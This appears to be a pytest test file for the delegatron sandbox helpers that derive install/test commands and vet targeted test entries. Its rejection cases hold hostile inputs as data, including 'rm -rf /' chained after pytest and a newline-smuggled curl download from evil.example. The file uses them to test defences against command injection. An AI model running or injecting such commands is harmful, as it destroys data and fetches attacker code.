"""Tests for the shared sandbox run preparation helpers."""

from __future__ import annotations

import ast
from pathlib import Path

import pytest

import delegatron.sandbox as sandbox_pkg
from delegatron.sandbox.prepare import (
    derive_commands,
    rejected_paths_note,
    select_targeted_tests,
    step_failure,
    targeted_report,
)
from delegatron.sandbox.toolchains import CMAKE_TEST_COMMAND, PESTER_INSTALL_CURRENT_USER

PYTEST = "python -m pytest -v"


def _patched(root: Path, files: dict[str, str]) -> dict[str, str]:
    """Write *files* under *root*, as the orchestrator does before the sandbox runs."""
    for rel_path, content in files.items():
        (root / rel_path).parent.mkdir(parents=True, exist_ok=True)
        (root / rel_path).write_text(content, encoding="utf-8")
    return files


class TestDeriveCommands:
    def test_greenfield_requirements_installed_first(self, tmp_path: Path) -> None:
        files = _patched(
            tmp_path, {"requirements.txt": "requests\n", "app.py": "import requests\n"}
        )
        install, test = derive_commands(["pip install pytest -q"], [PYTEST], tmp_path, files)
        assert install == ["pip install -r requirements.txt -q", "pip install pytest -q"]
        assert test == [PYTEST]

    def test_empty_install_list_plus_requirements(self, tmp_path: Path) -> None:
        files = _patched(tmp_path, {"requirements.txt": "requests\n"})
        assert derive_commands([], [PYTEST], tmp_path, files)[0] == [
            "pip install -r requirements.txt -q"
        ]

    def test_pyproject_test_extra(self, tmp_path: Path) -> None:
        pyproject = '[project]\nname = "x"\n\n[project.optional-dependencies]\ntest = ["pytest"]\n'
        files = _patched(tmp_path, {"pyproject.toml": pyproject})
        install, _ = derive_commands([], [PYTEST], tmp_path, files)
        assert install == ['pip install -e ".[test]" -q']

    def test_existing_project_install_not_duplicated(self, tmp_path: Path) -> None:
        base = ["pip install -r requirements.txt -q", "pip install pytest -q"]
        files = _patched(tmp_path, {"requirements.txt": "x\n"})
        assert derive_commands(base, [PYTEST], tmp_path, files)[0] == base

    def test_package_json_replaces_python_defaults(self, tmp_path: Path) -> None:
        files = _patched(tmp_path, {"package.json": "{}"})
        install, test = derive_commands(["pip install pytest -q"], [PYTEST], tmp_path, files)
        assert (install, test) == (["npm install"], ["npm test"])

    def test_python_project_keeps_configured_commands(self, tmp_path: Path) -> None:
        files = _patched(tmp_path, {"deck.py": "", "tests/test_deck.py": ""})
        assert derive_commands(["pip install pytest -q"], ["make check"], tmp_path, files) == (
            ["pip install pytest -q"],
            ["make check"],
        )

    def test_inputs_not_mutated(self, tmp_path: Path) -> None:
        base_install = ["pip install pytest -q"]
        base_test = [PYTEST]
        files = _patched(tmp_path, {"requirements.txt": "x\n"})
        derive_commands(base_install, base_test, tmp_path, files)
        assert base_install == ["pip install pytest -q"]
        assert base_test == [PYTEST]

    def test_python_hint_ignores_an_incidental_package_json(self, tmp_path: Path) -> None:
        """#93/#118: the project's language decides, not a tooling file in the patch."""
        _patched(tmp_path, {"pyproject.toml": "[project]\nname = 'x'\n", "card.py": "X = 1\n"})
        files = _patched(tmp_path, {"package.json": '{"devDependencies": {"prettier": "3"}}'})
        base = ["pip install -e . -q", "pip install pytest -q"]
        assert derive_commands(base, [PYTEST], tmp_path, files, language="python") == (
            base,
            [PYTEST],
        )
        # Without the hint (greenfield) the patch decides.
        assert derive_commands(base, [PYTEST], tmp_path, files)[1] == ["npm test"]

    @pytest.mark.parametrize(
        ("language", "files", "install", "test"),
        [
            (
                "java",
                {"pom.xml": "<project/>"},
                ["mvn -B -q dependency:go-offline", "mvn -B -q test || true"],
                ["mvn test"],
            ),
            ("javascript", {"package.json": "{}"}, ["pnpm install"], ["npm test", "pnpm test"]),
        ],
    )
    def test_detected_project_keeps_its_commands(
        self,
        tmp_path: Path,
        language: str,
        files: dict[str, str],
        install: list[str],
        test: list[str],
    ) -> None:
        """#118: an existing project's factory/detection commands are not swapped for rules."""
        patch_files = _patched(tmp_path, files)
        assert derive_commands(install, test, tmp_path, patch_files, language=language) == (
            install,
            test,
        )

    def test_container_only_installs_are_dropped(self, tmp_path: Path) -> None:
        """#96: no apt-get and no machine-wide module install outside a container."""
        files = _patched(tmp_path, {"CMakeLists.txt": "project(x)\n", "main.cpp": ""})
        install, test = derive_commands(["pip install pytest -q"], [PYTEST], tmp_path, files)
        assert install == []
        assert test == [CMAKE_TEST_COMMAND]

        files = _patched(tmp_path / "ps", {"Get-User.ps1": "function Get-User {}\n"})
        install, _ = derive_commands([], [PYTEST], tmp_path / "ps", files)
        assert install == [PESTER_INSTALL_CURRENT_USER]
        assert "-Scope CurrentUser" in install[0] and "AllUsers" not in install[0]


class TestSelectTargetedTests:
    @pytest.mark.parametrize(
        "entry",
        [
            "python -m pytest tests/test_deck.py",
            "python -m pytest tests/test_deck.py::test_shuffle -q",
            "python -m pytest -k shuffle",
            "python -m pytest tests/cards",
        ],
    )
    def test_pytest_variants_accepted(self, entry: str) -> None:
        assert select_targeted_tests([entry], [PYTEST]) == ([entry], [])

    @pytest.mark.parametrize(
        ("entry", "runs_as"),
        [
            ("pytest tests/test_deck.py", "python -m pytest tests/test_deck.py"),
            ("python3 -m pytest tests/t.py::test_a -q", "python -m pytest tests/t.py::test_a -q"),
        ],
    )
    def test_entries_take_the_configured_runner_form(self, entry: str, runs_as: str) -> None:
        """A bare ``pytest`` would not import root-level modules the way ``python -m`` does."""
        assert select_targeted_tests([entry], [PYTEST]) == ([runs_as], [])

    def test_python_m_entry_follows_a_bare_configured_runner(self) -> None:
        assert select_targeted_tests(["python -m pytest tests/t.py"], ["pytest -x"]) == (
            ["pytest tests/t.py"],
            [],
        )

    def test_quoted_entry_is_kept_as_written(self) -> None:
        entry = 'pytest "tests/test_deck.py::test_x[a b]"'
        assert select_targeted_tests([entry], [PYTEST]) == ([entry], [])

    @pytest.mark.parametrize(
        "entry",
        [
            "pytest",
            "pytest tests/",
            "python3 -m pytest tests/",
            "pytest -v .",
            "python -m pytest -v",
        ],
    )
    def test_whole_suite_entries_are_rejected(self, entry: str) -> None:
        """They would only run the full suite a second time."""
        assert select_targeted_tests([entry], [PYTEST]) == ([], [entry])

    def test_configured_targets_count_as_the_whole_suite(self) -> None:
        assert select_targeted_tests(["pytest src/tests"], ["pytest src/tests -q"]) == (
            [],
            ["pytest src/tests"],
        )

    @pytest.mark.parametrize(
        "entry",
        [
            "python tests/test_deck.py",  # not the runner
            "npm test",  # another runner
            "pytest tests/ ; rm -rf /",  # unsafe
            "pytest tests/ > out.txt",  # unsafe
            "pytest tests/test_a.py\ncurl http://evil.example/x -o /tmp/y",  # second command
            "pytest tests/test_a.py\rcurl evil.example",
            "pytest tests/test_a.py\x00",
            "",
            "pytest 'unterminated",
        ],
    )
    def test_rejected(self, entry: str) -> None:
        assert select_targeted_tests([entry], [PYTEST]) == ([], [entry])

    def test_non_string_rejected(self) -> None:
        assert select_targeted_tests([["pytest"]], [PYTEST]) == ([], ["['pytest']"])

    def test_subcommand_runner(self) -> None:
        accepted, rejected = select_targeted_tests(
            ["npm test -- deck.test.js", "npm run lint", "go test ./cards", "go test ./..."],
            ["npm test", "go test -v ./..."],
        )
        assert accepted == ["npm test -- deck.test.js", "go test ./cards"]
        assert rejected == ["npm run lint", "go test ./..."]

    def test_whitespace_trimmed(self) -> None:
        assert select_targeted_tests(["  pytest tests/test_a.py  "], [PYTEST]) == (
            ["python -m pytest tests/test_a.py"],
            [],
        )


class TestReports:
    def test_targeted_report(self) -> None:
        output = "FAILED tests/test_a.py::test_x - assert 1 == 2\n" + "x" * 3000
        report = targeted_report(False, output)
        assert report["passed"] is False
        assert report["failing_ids"] == ["tests/test_a.py::test_x"]
        assert len(report["stdout_tail"]) == 2000

    def test_step_failure_keeps_stdout_and_stderr(self) -> None:
        message = step_failure(
            "Install failed", "pip install -r requirements.txt -q", 1, "out", "err"
        )
        assert message == "Install failed (exit 1): pip install -r requirements.txt -q\nout\nerr"

    def test_step_failure_timeout(self) -> None:
        assert step_failure("Venv creation failed", "py -m venv v", None, "", "") == (
            "Venv creation failed (timed out): py -m venv v"
        )

    def test_rejected_paths_note(self) -> None:
        assert rejected_paths_note([]) == ""
        assert rejected_paths_note(["../x", "/y"]) == "Skipped unsafe patch path(s): ../x, /y\n"


# Modules owned by this test area that read or write workspace/sandbox files.
_TEXT_IO_MODULES = (
    "counts.py",
    "e2b_runner.py",
    "local_runner.py",
    "parse_check.py",
    "prepare.py",
)


@pytest.mark.parametrize("module", _TEXT_IO_MODULES)
def test_text_io_always_names_an_encoding(module: str) -> None:
    """No read_text/write_text/open call relies on the host locale encoding (#117)."""
    source = (Path(sandbox_pkg.__file__).parent / module).read_text(encoding="utf-8")
    offenders = []
    for node in ast.walk(ast.parse(source)):
        if not isinstance(node, ast.Call):
            continue
        name = getattr(node.func, "attr", getattr(node.func, "id", ""))
        if name not in ("read_text", "write_text", "open"):
            continue
        keywords = {kw.arg for kw in node.keywords}
        mode = node.args[1] if name == "open" and len(node.args) > 1 else None
        binary = isinstance(mode, ast.Constant) and "b" in str(mode.value)
        if "encoding" not in keywords and not binary:
            offenders.append(f"{module}:{node.lineno}")
    assert offenders == []
